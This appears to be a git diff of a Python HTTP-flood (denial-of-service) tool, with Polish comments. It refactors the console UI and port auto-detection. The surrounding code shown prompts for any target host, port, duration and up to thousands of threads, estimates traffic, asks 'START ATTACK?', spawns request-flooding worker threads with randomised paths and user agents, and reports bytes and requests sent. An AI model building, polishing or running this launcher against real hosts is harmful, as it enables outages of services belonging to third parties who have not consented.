@@ -10,6 +10,7 @@ import argparse
 import sys
 import random
 import os
+import re 
 
 # --- Set Console Title ---
 def set_console_title(title_text):
@@ -49,16 +50,10 @@ BOX_TOP_LEFT_CHAR = "╭"
 BOX_TOP_RIGHT_CHAR = "╮"
 BOX_BOTTOM_LEFT_CHAR = "╰"
 BOX_BOTTOM_RIGHT_CHAR = "╯"
-BOX_T_DOWN_CHAR = "┬"
-BOX_T_UP_CHAR = "┴"
-BOX_T_LEFT_CHAR = "┤"
-BOX_T_RIGHT_CHAR = "├"
-BOX_CROSS_CHAR = "┼"
 
-UI_WIDTH = 70 # Szerokość dla elementów UI
-
+UI_WIDTH = 70 
 LINE_SEP = Colors.OKBLUE + LINE_SEP_CHAR * UI_WIDTH + Colors.ENDC
-BOX_HLINE = Colors.OKBLUE + BOX_HLINE_CHAR * (UI_WIDTH - 2) + Colors.ENDC # -2 for corners
+BOX_HLINE_STRIPPED_FOR_BOX = BOX_HLINE_CHAR * (UI_WIDTH - 2)
 
 BANNER = f"""
 {Colors.OKCYAN}{Colors.BOLD}
@@ -75,53 +70,69 @@ DEFAULT_THREADS_LOW_RESOURCE = 5
 DEFAULT_THREADS_NORMAL = 100
 
 # --- Helper Functions ---
+def strip_ansi_codes(text):
+    return re.sub(r'\x1b\[([0-9,A-Z]{1,2}(;[0-9]{1,2})?(;[0-9]{1,2})?)?[m|K|H|f|J]', '', text)
+
+def visible_len(text_with_ansi):
+    return len(strip_ansi_codes(text_with_ansi))
+
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
     current_stop_key_info = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Ctrl+C TO STOP"
     set_console_title(f"{PROGRAM_NAME} - {current_stop_key_info}")
 
 def print_ui_header(text, color=Colors.OKCYAN):
-    print(f"\n{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH - 2)}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
-    # Center text within the available space (UI_WIDTH - 4 for padding and vlines)
-    padding_total = UI_WIDTH - 4 - len(text.replace(Colors.BOLD, "").replace(Colors.ENDC, "")) # Adjust for ANSI codes in text
+    print(f"\n{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
+    text_content = f"{color}{Colors.BOLD}{text}{Colors.ENDC}"
+    content_visible_len = visible_len(text_content)
+    innerWidth = UI_WIDTH - 2 # Przestrzeń między pionowymi liniami
+    padding_total = innerWidth - content_visible_len
     padding_left = padding_total // 2
     padding_right = padding_total - padding_left
-    print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC} {' ' * padding_left}{color}{Colors.BOLD}{text}{Colors.ENDC}{' ' * padding_right} {Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
-    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH - 2)}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
+    padding_left = max(0, padding_left)
+    padding_right = max(0, padding_right)
+    print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}{' ' * padding_left}{text_content}{' ' * padding_right}{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
+    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
 
-
-def print_boxed_info(label, value, color=Colors.OKGREEN):
-    # Adjust width for label, value and padding
-    # Example: "│ Label:          Value                                      │"
-    # Max label width around 20-25 for readability
-    label_formatted = f"{color}{label:<20}{Colors.ENDC}"
-    value_formatted = f"{Colors.BOLD}{value}{Colors.ENDC}"
+def print_boxed_line(content, key_width=0):
+    """Drukuje pojedynczą linię wewnątrz ramki, opcjonalnie z wyrównaniem dla klucza."""
+    # Całkowita dostępna szerokość na treść wewnątrz ramki (bez spacji na początku/końcu linii)
+    available_width_for_content = UI_WIDTH - 4 # -2 na pionowe linie, -2 na spacje wiodące/końcowe
     
-    # Calculate remaining space for value after label and box characters/padding
-    # 2 for vlines, 2 for spaces around label, 2 for spaces around value
-    remaining_width = UI_WIDTH - 2 - 2 - len(label.replace(Colors.BOLD, "").replace(Colors.ENDC, "")) -2
+    # Jeśli klucz ma określoną szerokość, użyj jej
+    if key_width > 0:
+        # Zakładamy, że 'content' to sformatowany string, np. f"{key_formatted} {value_formatted}"
+        # Tutaj musimy być ostrożni, bo `content` już może mieć kolory
+        pass # Ta funkcja będzie teraz bardziej ogólna, klucz-wartość osobno
+
+    content_visible_len = visible_len(content)
+    padding_right = available_width_for_content - content_visible_len
+    padding_right = max(0, padding_right) # Upewnij się, że nie jest ujemny
+
+    print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC} {content}{' ' * padding_right} {Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
+
+
+def print_boxed_key_value(key_text, value_text, key_color=Colors.OKBLUE, value_color=Colors.BOLD):
+    """Drukuje sformatowaną linię klucz-wartość wewnątrz ramki."""
+    # Stała szerokość dla etykiety klucza (bez kolorów)
+    label_width = 23 
+    key_formatted = f"{key_color}{key_text:<{label_width}}{Colors.ENDC}"
+    value_formatted = f"{value_color}{value_text}{Colors.ENDC}"
     
-    # Truncate value if too long, or pad
-    value_display = str(value)
-    if len(value_display) > remaining_width:
-        value_display = value_display[:remaining_width-3] + "..."
-    else:
-        value_display = f"{value_display:<{remaining_width}}"
+    line_content = f"{key_formatted} {value_formatted}"
+    print_boxed_line(line_content)
 
 
-    print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC} {label_formatted} {Colors.BOLD}{value_display}{Colors.ENDC} {Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
-
-
-def print_warning(text): print(f"{Colors.WARNING}│ [!] WARNING:{Colors.ENDC} {text}") # Boxed style
+def print_warning(text): print(f"{Colors.WARNING}│ [!] WARNING:{Colors.ENDC} {text}")
 def print_info(text): print(f"{Colors.OKCYAN}│ [*] INFO:{Colors.ENDC} {text}")
 def print_success(text): print(f"{Colors.OKGREEN}│ [+] SUCCESS:{Colors.ENDC} {text}")
 def print_error(text): print(f"{Colors.FAIL}│ [X] ERROR:{Colors.ENDC} {text}")
 
-
+# ... (get_random_user_agent, format_size, is_valid_ip, attack_worker - bez zmian) ...
 def get_random_user_agent():
     return random.choice([
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        f"{PROGRAM_NAME} Threaded Agent/1.1" # Updated version
+        f"{PROGRAM_NAME} Threaded Agent/1.1"
     ])
 
 def format_size(num_bytes):
@@ -134,7 +145,6 @@ def is_valid_ip(address):
     try: socket.inet_aton(address); return True
     except socket.error: return False
 
-# --- Main Attack Logic (Threading) ---
 def attack_worker(target_ip, target_port, target_host_header, use_ssl):
     global packets_sent, bytes_sent
     path = f"/?{random.randint(1000, 99999)}"
@@ -170,7 +180,6 @@ def estimate_traffic(target_input_for_est, port, num_threads, duration):
     single_request_size_bytes = len(request_str.encode('utf-8')); connections_per_sec_per_thread = 2.0; successful_connections = 0; total_time_for_test = 0.0
     num_test_connections = max(1, min(3, num_threads // 20 if num_threads > 0 else 1)) 
     if num_test_connections > 0:
-        # print_info(f"Performing {num_test_connections} test connections...") # Less verbose
         for _ in range(num_test_connections):
             start_conn_time = time.perf_counter()
             try:
@@ -186,29 +195,30 @@ def estimate_traffic(target_input_for_est, port, num_threads, duration):
             else: connections_per_sec_per_thread = 50.0 
             print_info(f"Avg. test conn time: {avg_time_per_connection:.4f}s | Est. conn/s/thread: {connections_per_sec_per_thread:.2f}")
         else: print_warning("Failed test connections for estimation. Using default rate.")
-    # else: print_info("Skipped test connections. Using default rate.")
     connections_per_sec_per_thread = min(connections_per_sec_per_thread, 100.0); connections_per_sec_per_thread = max(connections_per_sec_per_thread, 0.5)
     estimated_total_requests = num_threads * connections_per_sec_per_thread * duration; estimated_total_data_bytes = estimated_total_requests * single_request_size_bytes
     
-    print_boxed_info("Req. Size (payload):", f"{single_request_size_bytes} B", Colors.OKBLUE)
-    print_boxed_info("Est. Total Requests:", f"{int(estimated_total_requests)}", Colors.OKBLUE)
-    print_boxed_info("Est. Outgoing Traffic:", f"{Colors.BOLD}{format_size(estimated_total_data_bytes)}{Colors.ENDC}", Colors.OKGREEN)
-    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH - 2)}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
+    print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
+    print_boxed_key_value("Req. Size (payload)", f"{single_request_size_bytes} B")
+    print_boxed_key_value("Est. Total Requests", str(int(estimated_total_requests)))
+    print_boxed_key_value("Est. Outgoing Traffic", format_size(estimated_total_data_bytes), value_color=f"{Colors.OKGREEN}{Colors.BOLD}")
+    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
     print_warning("This is a VERY ROUGH estimate."); print_warning("Does not include protocol overhead or server responses.")
     return estimated_total_data_bytes, estimated_total_requests
 
 # --- Interactive Input Function ---
 def get_interactive_input():
+    # ... (bez zmian w logice, tylko w promptach i komunikatach - jak w poprzedniej wersji)
     clear_console(); print(BANNER)
     print_ui_header(f"{PROGRAM_NAME} INTERACTIVE SETUP")
     current_default_threads = DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL
     
     def get_styled_input(prompt_main, prompt_example="", default_value_text=""):
-        full_prompt = f"{Colors.OKCYAN}❯ {prompt_main}:{Colors.ENDC} "
+        full_prompt = f" {Colors.OKCYAN}❯ {prompt_main}:{Colors.ENDC} "
         if prompt_example: full_prompt += f"{Colors.OKBLUE}({prompt_example}){Colors.ENDC} "
         if default_value_text: full_prompt += f"[{Colors.OKGREEN}{default_value_text}{Colors.ENDC}] "
         try: return input(full_prompt).strip()
-        except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting."); sys.exit(1)
+        except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
 
     target_input_val = "" 
     while not target_input_val:
@@ -223,13 +233,25 @@ def get_interactive_input():
         raw_port = get_styled_input("Enter target port", "80, 443, empty for auto")
         if not raw_port: 
             print_info(f"Auto-detecting port for {Colors.BOLD}{target_input_val}{Colors.ENDC}...")
+            port_443_successful = False
             try:
-                print_info("Testing port 443 (HTTPS)..."); s=socket.create_connection((target_input_val,443),2);s.close()
-                target_port_val=443; print_success(f"Auto-detected port: {Colors.BOLD}443 (HTTPS){Colors.ENDC}"); break
-            except:
-                print_warning("Port 443 failed. Testing port 80 (HTTP)...")
-                try: s=socket.create_connection((target_input_val,80),2);s.close();target_port_val=80;print_success(f"Auto-detected port: {Colors.BOLD}80 (HTTP){Colors.ENDC}");break
-                except: print_error("Auto-detection failed. Please specify port."); continue
+                print_info("Testing port 443 (HTTPS)..."); 
+                s_test_ssl = socket.create_connection((target_input_val, 443), timeout=3) 
+                context_test = ssl.create_default_context()
+                conn_test_ssl = context_test.wrap_socket(s_test_ssl, server_hostname=target_input_val if not is_valid_ip(target_input_val) else None)
+                conn_test_ssl.close()
+                target_port_val=443; print_success(f"Auto-detected port: {Colors.BOLD}443 (HTTPS){Colors.ENDC}"); 
+                port_443_successful = True; break 
+            except (socket.timeout, ConnectionRefusedError, OSError): print_warning(f"Port 443 test (network) failed.")
+            except ssl.SSLError: print_warning(f"Port 443 test (SSL) failed. Might be open but with SSL issues.")
+            except Exception: print_warning(f"Port 443 test (other) failed.")
+            if not port_443_successful:
+                print_info("Testing port 80 (HTTP)..."); 
+                try:
+                    s_test_http=socket.create_connection((target_input_val,80), timeout=2); s_test_http.close()
+                    target_port_val=80;print_success(f"Auto-detected port: {Colors.BOLD}80 (HTTP){Colors.ENDC}");break
+                except Exception: print_error(f"Port 80 test failed. Could not auto-detect. Please specify manually."); continue
+            if target_port_val is None: continue
         else:
             try:
                 port_val_int = int(raw_port)
@@ -240,7 +262,7 @@ def get_interactive_input():
     
     duration_val = None
     while duration_val is None:
-        raw_duration = get_styled_input("Enter duration (seconds)", "default: 60")
+        raw_duration = get_styled_input("Enter duration (seconds)", f"default: 60")
         if not raw_duration: duration_val = 60; print_success(f"Duration set to default: {Colors.BOLD}60s{Colors.ENDC}\n"); break
         try:
             duration_val_int = int(raw_duration)
@@ -258,7 +280,7 @@ def get_interactive_input():
             if threads_val_int <= 0: print_warning("Threads must be > 0."); continue
             if threads_val_int > 5000: print_warning(f"Threads ({threads_val_int}) EXTREMELY high!")
             elif threads_val_int > 2000 and KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) very high.")
-            elif threads_val_int > 50 and not KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) high for no-ESC.")
+            elif threads_val_int > 50 and not KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) high for no-ESC env.")
             num_threads_val = threads_val_int
             print_success(f"Threads set to: {Colors.BOLD}{num_threads_val}{Colors.ENDC}\n")
         except ValueError: print_warning("Not a valid number.")
@@ -266,7 +288,7 @@ def get_interactive_input():
     return target_input_val, target_port_val, duration_val, num_threads_val
 
 # --- ESC Key Press Callback ---
-def esc_listener_thread_func():
+def esc_listener_thread_func(): # Bez zmian
     global user_interrupted_attack, stop_event
     if KEYBOARD_AVAILABLE and keyboard:
         try:
@@ -285,12 +307,12 @@ def run_attack(target_input_val, target_port_val, duration_val, num_threads_val)
     set_console_title(current_attack_title)
 
     print_ui_header("ATTACK CONFIGURATION", Colors.OKGREEN)
-    print_boxed_info("Target:", target_input_val, Colors.OKBLUE)
-    print_boxed_info("Port:", str(target_port_val), Colors.OKBLUE)
-    print_boxed_info("Duration:", f"{duration_val} seconds", Colors.OKBLUE)
-    print_boxed_info("Threads:", str(num_threads_val), Colors.OKBLUE)
-    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH-2)}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}\n")
-
+    print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
+    print_boxed_key_value("Target:", target_input_val)
+    print_boxed_key_value("Port:", str(target_port_val))
+    print_boxed_key_value("Duration:", f"{duration_val} seconds")
+    print_boxed_key_value("Threads:", str(num_threads_val))
+    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}\n")
 
     target_ip_to_connect = None; target_host_for_header = target_input_val
     if is_valid_ip(target_input_val): target_ip_to_connect = target_input_val; print_info(f"Target '{target_input_val}' is an IP address.")
@@ -299,16 +321,17 @@ def run_attack(target_input_val, target_port_val, duration_val, num_threads_val)
         try: target_ip_to_connect = socket.gethostbyname(target_input_val); print_success(f"Resolved to IP: {target_ip_to_connect}")
         except socket.gaierror as e: print_error(f"Could not resolve domain '{target_input_val}': {e}"); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return False 
     if not target_ip_to_connect: print_error("Could not determine IP address for connection."); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return False
-
+    
     estimate_traffic(target_input_val, target_port_val, num_threads_val, duration_val)
 
     try:
-        confirm = input(f"{Colors.WARNING}│ [?] START ATTACK?{Colors.ENDC} ({Colors.OKGREEN}YES{Colors.ENDC}/{Colors.FAIL}NO{Colors.ENDC}): ").strip().upper()
+        confirm_prompt = f" {Colors.WARNING}│ [?] START ATTACK?{Colors.ENDC} ({Colors.OKGREEN}YES{Colors.ENDC}/{Colors.FAIL}NO{Colors.ENDC}): "
+        confirm = input(confirm_prompt).strip().upper()
         if confirm != 'YES': print_info("Attack start cancelled."); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return "cancelled"
     except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
     
     use_ssl = (target_port_val == 443); 
-    print_ui_header("ATTACK IN PROGRESS", Colors.FAIL) # Red header for attack
+    print_ui_header("ATTACK IN PROGRESS", Colors.FAIL)
     print_info(f"Attacking {Colors.BOLD}{target_ip_to_connect}:{target_port_val}{Colors.ENDC} for {Colors.BOLD}{duration_val}{Colors.ENDC}s...")
     listener_thread_obj = None
     if KEYBOARD_AVAILABLE: 
@@ -321,38 +344,22 @@ def run_attack(target_input_val, target_port_val, duration_val, num_threads_val)
         thread = threading.Thread(target=attack_worker, args=(target_ip_to_connect, target_port_val, target_host_for_header, use_ssl))
         threads_list.append(thread); thread.daemon = True; thread.start()
     try:
-        progress_bar_length = UI_WIDTH - 50 # Adjust progress bar length
-        if progress_bar_length < 10 : progress_bar_length = 10
-
+        progress_bar_fixed_width = 25 
         while True:
             elapsed_time = time.perf_counter() - start_time
             if elapsed_time >= duration_val or stop_event.is_set(): break 
-            current_bytes = bytes_sent; current_packets = packets_sent
-            bytes_per_sec = current_bytes / elapsed_time if elapsed_time > 0 else 0
-            packets_per_sec = current_packets / elapsed_time if elapsed_time > 0 else 0
-            progress = min(1.0, elapsed_time / duration_val); filled_length = int(progress_bar_length * progress)
-            bar = '█' * filled_length + '-' * (progress_bar_length - filled_length)
-            
-            # Construct status line carefully to fit and look good
-            time_str = f"{elapsed_time:.1f}s/{duration_val}s"
-            sent_str = f"Sent: {format_size(current_bytes)} ({current_packets} pkts)"
-            speed_str = f"Speed: {format_size(bytes_per_sec)}/s ({packets_per_sec:.0f} pps)"
-            
-            # Calculate padding for centering bar and text
-            bar_text = f"{Colors.OKCYAN}Progress{Colors.ENDC}: [{Colors.OKGREEN}{bar}{Colors.ENDC}] {progress*100:.1f}%"
-            remaining_width_for_stats = UI_WIDTH - len(bar_text.replace(Colors.OKCYAN,"").replace(Colors.ENDC,"").replace(Colors.OKGREEN,"")) -5 # -5 for \r and spaces
-            
-            stats_str = f"{time_str} | {sent_str} | {speed_str}"
-            if len(stats_str) > remaining_width_for_stats: # Truncate stats if too long
-                stats_str = f"{time_str} | {sent_str[:15]}... | {speed_str[:15]}..."
-
-
-            status_line = f"\r{bar_text} | {stats_str}"
-            # Pad with spaces to clear previous longer lines
-            status_line += ' ' * (UI_WIDTH - len(status_line.replace(Colors.OKCYAN,"").replace(Colors.ENDC,"").replace(Colors.OKGREEN,"").replace(Colors.BOLD,"")) ) 
-            
-            sys.stdout.write(status_line); sys.stdout.flush(); time.sleep(0.1)
-            
+            current_bytes_val = bytes_sent; current_packets_val = packets_sent
+            bytes_per_sec = current_bytes_val / elapsed_time if elapsed_time > 0 else 0
+            packets_per_sec = current_packets_val / elapsed_time if elapsed_time > 0 else 0
+            progress = min(1.0, elapsed_time / duration_val); filled_length = int(progress_bar_fixed_width * progress)
+            bar = '█' * filled_length + '-' * (progress_bar_fixed_width - filled_length)
+            progress_text = f"{Colors.OKCYAN}Progress{Colors.ENDC}: [{Colors.OKGREEN}{bar}{Colors.ENDC}] {progress*100:.1f}%"
+            time_text = f"{Colors.BOLD}{elapsed_time:.1f}s{Colors.ENDC}/{duration_val}s"
+            sent_text = f"Sent: {Colors.BOLD}{format_size(current_bytes_val)}{Colors.ENDC} ({current_packets_val} pkts)"
+            speed_text = f"Speed: {Colors.BOLD}{format_size(bytes_per_sec)}/s{Colors.ENDC} ({packets_per_sec:.0f} pps)"
+            status_line_content = f"{progress_text} | {time_text} | {sent_text} | {speed_text}"
+            padding = UI_WIDTH - (visible_len(status_line_content)) -1 ; padding = max(0, padding)
+            sys.stdout.write(f"\r{status_line_content}{' ' * padding}"); sys.stdout.flush(); time.sleep(0.1)
         if not stop_event.is_set() and not user_interrupted_attack: sys.stdout.write("\n"); print_info("Test duration elapsed.")
     except KeyboardInterrupt:
         if not KEYBOARD_AVAILABLE or not listener_thread_obj or not listener_thread_obj.is_alive():
@@ -363,20 +370,20 @@ def run_attack(target_input_val, target_port_val, duration_val, num_threads_val)
         set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); sys.stdout.write("\n"); sys.stdout.flush()
         if not stop_event.is_set(): stop_event.set()
         print_info("Waiting for threads to finish..."); time.sleep(0.5)
-        
         final_elapsed_time = time.perf_counter() - start_time
-        print_ui_header("ATTACK RESULTS", Colors.OKGREEN) # Green header for results
-        print_boxed_info("Actual Duration:", f"{final_elapsed_time:.2f} seconds", Colors.OKBLUE)
-        print_boxed_info("Requests Sent:", str(packets_sent), Colors.OKBLUE)
-        print_boxed_info("Data Sent:", format_size(bytes_sent), Colors.OKBLUE)
+        print_ui_header("ATTACK RESULTS", Colors.OKGREEN)
+        print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
+        print_boxed_key_value("Actual Duration:", f"{final_elapsed_time:.2f} seconds")
+        print_boxed_key_value("Requests Sent:", str(packets_sent))
+        print_boxed_key_value("Data Sent (Payload):", format_size(bytes_sent))
         if final_elapsed_time > 0:
             avg_bps = bytes_sent / final_elapsed_time; avg_pps = packets_sent / final_elapsed_time
-            print_boxed_info("Average Speed:", f"{format_size(avg_bps)}/s ({avg_pps:.0f} pps)", Colors.OKBLUE)
+            print_boxed_key_value("Average Speed:", f"{format_size(avg_bps)}/s ({avg_pps:.0f} pps)")
+        print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
         if user_interrupted_attack: 
             interrupt_method = "ESC" if (KEYBOARD_AVAILABLE and listener_thread_obj and not listener_thread_obj.is_alive()) else "Ctrl+C"
             print_warning(f"Attack was interrupted by user {interrupt_method}.")
-        print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH-2)}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}\n")
-        print_success(f"--- {Colors.BOLD}{PROGRAM_NAME} Attack Finished{Colors.ENDC} ---")
+        print_success(f"--- {Colors.BOLD}{PROGRAM_NAME} Attack Finished{Colors.ENDC} ---\n")
     return True
 
 # --- Main Function ---
@@ -426,12 +433,14 @@ def main():
                 "Start a new attack (new settings)",
                 "Close program"
             ]
+            print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
             for i, option in enumerate(menu_options):
-                print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC} {Colors.OKCYAN}[{i+1}]{Colors.ENDC} {option.ljust(UI_WIDTH - 8)} {Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
-            print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH-2)}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
+                menu_line_content = f" {Colors.OKCYAN}[{i+1}]{Colors.ENDC} {option}"
+                print_boxed_line(menu_line_content) # Użyj nowej funkcji
+            print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
 
             try:
-                choice = input(f"{Colors.OKGREEN}❯ Your choice (1-3): {Colors.ENDC}").strip()
+                choice = input(f" {Colors.OKGREEN}❯ Your choice (1-3): {Colors.ENDC}").strip()
                 if choice == '1': clear_console(); print(BANNER); get_new_params = False; break 
                 elif choice == '2': get_new_params = True; break 
                 elif choice == '3': print_info(f"Thank you for using {Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC}. Closing..."); sys.exit(0)
